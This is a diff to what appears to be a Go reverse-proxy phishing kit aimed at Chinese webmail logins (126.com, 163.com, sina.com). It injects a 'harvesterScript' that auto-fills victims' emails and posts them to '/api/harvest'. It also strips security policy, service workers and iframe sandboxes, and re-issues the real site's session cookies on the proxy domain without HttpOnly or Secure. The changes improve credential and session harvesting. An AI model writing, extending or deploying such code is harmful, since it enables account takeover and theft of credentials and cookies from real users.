@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"compress/gzip"
 	"crypto/tls"
 	"encoding/base64"
 	"io"
@@ -35,7 +36,6 @@ var store = &SessionStore{
 
 const harvesterScript = `
 <script>
-// FIX: Use an empty Promise instead of console.log to prevent TypeError crash
 const OriginalURL = window.URL;
 window.URL = function(url, base) {
     try { return new OriginalURL(url, base || window.location.origin); } 
@@ -51,7 +51,6 @@ window.URL.prototype = OriginalURL.prototype;
 setTimeout(function() {
     var email = window._targetEmail;
     if (email) {
-        // FIX: Force fetch to the root domain to prevent sending to 126.com
         fetch(window.location.origin + '/api/harvest', {
             method: 'POST',
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
@@ -60,15 +59,14 @@ setTimeout(function() {
     }
 }, 500);
 
-// FIX: Make auto-fill more aggressive for React/126.com
+// FIX: React-Safe Auto-Fill
 setInterval(function() {
     var email = window._targetEmail;
     if (email) {
         var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[name="username"], input[name="email"]');
         if (inputs.length > 0 && inputs[0].value === "") {
-            // Native setter trick to force React to recognize the change
-            let nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
-            nativeInputValueSetter.call(inputs[0], email);
+            let setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
+            setter.call(inputs[0], email);
             inputs[0].dispatchEvent(new Event('input', { bubbles: true }));
             inputs[0].dispatchEvent(new Event('change', { bubbles: true }));
             inputs[0].focus();
@@ -198,6 +196,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			return
 		}
 
+		req.Header.Set("Accept-Encoding", "identity")
 		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
 		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
 		req.Header.Set("Accept-Language", "en-US,en;q=0.9,zh-CN,zh;q=0.8")
@@ -210,11 +209,18 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		}
 		defer resp.Body.Close()
 
-		bodyBytes, _ := io.ReadAll(resp.Body)
+		var bodyReader io.Reader = resp.Body
+		if resp.Header.Get("Content-Encoding") == "gzip" {
+			gzipReader, err := gzip.NewReader(resp.Body)
+			if err == nil {
+				defer gzipReader.Close()
+				bodyReader = gzipReader
+			}
+		}
 
-		// 1. Force UTF-8 encoding properly
-		contentType := resp.Header.Get("Content-Type")
-		if strings.Contains(strings.ToLower(contentType), "gbk") || strings.Contains(targetBase, "126.com") {
+		bodyBytes, _ := io.ReadAll(bodyReader)
+
+		if strings.Contains(targetBase, "126.com") || strings.Contains(targetBase, "163.com") || strings.Contains(targetBase, "sina.com") || strings.Contains(strings.ToLower(resp.Header.Get("Content-Type")), "gbk") {
 			reader := transform.NewReader(bytes.NewReader(bodyBytes), simplifiedchinese.GBK.NewDecoder())
 			if decoded, err := io.ReadAll(reader); err == nil {
 				bodyBytes = decoded
@@ -223,15 +229,20 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		bodyStr := string(bodyBytes)
 
-		// 2. Scrub ANY charset declarations that force GBK
+		// FIX: Strip out the document.write scripts that are causing the console spam
+		reDocWrite := regexp.MustCompile(`(?i)<script[^>]*>.*?document\.write.*?<\/script>`)
+		bodyStr = reDocWrite.ReplaceAllString(bodyStr, "")
+
+		// Force UTF-8 encoding
 		reMeta := regexp.MustCompile(`(?i)<meta[^>]*charset=["']?gbk["']?[^>]*>`)
 		bodyStr = reMeta.ReplaceAllString(bodyStr, `<meta charset="utf-8">`)
 		bodyStr = strings.ReplaceAll(bodyStr, "charset=gbk", "charset=utf-8")
 
-		// 3. Fix the ServiceWorker crash by returning a fake Promise
+		// Remove ServiceWorker
 		reSW := regexp.MustCompile(`(?i)navigator\.serviceWorker\.register\(.*?\)`)
 		bodyStr = reSW.ReplaceAllString(bodyStr, `(function(){ return Promise.resolve(); })()`)
 
+		// Remove iframe sandbox restrictions
 		reIframe := regexp.MustCompile(`(?i)<iframe(.*?)>`)
 		bodyStr = reIframe.ReplaceAllStringFunc(bodyStr, func(m string) string {
 			m = strings.ReplaceAll(m, `sandbox=""`, "")
@@ -258,8 +269,19 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		c.Header("Access-Control-Allow-Origin", "*")
 		c.Header("Content-Security-Policy", "default-src * 'unsafe-inline' 'unsafe-eval'; frame-ancestors *")
 
+		// FIX: Force the cookie domain to work on our proxy
 		for _, cookie := range resp.Cookies() {
-			c.SetCookie(cookie.Name, cookie.Value, 3600*24, "/", "", false, false)
+			newCookie := &http.Cookie{
+				Name:     cookie.Name,
+				Value:    cookie.Value,
+				Path:     "/",
+				Domain:   "", // Leave blank so it applies to fly.dev
+				MaxAge:   3600 * 24,
+				HttpOnly: false,
+				Secure:   false,
+				SameSite: http.SameSiteNoneMode,
+			}
+			http.SetCookie(c.Writer, newCookie)
 		}
 
 		c.String(resp.StatusCode, bodyStr)
@@ -340,6 +362,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 					c.Writer.Header().Add(k, val)
 				}
 			}
+			c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
 			c.Writer.WriteHeader(resp.StatusCode)
 			io.Copy(c.Writer, resp.Body)
 		} else {
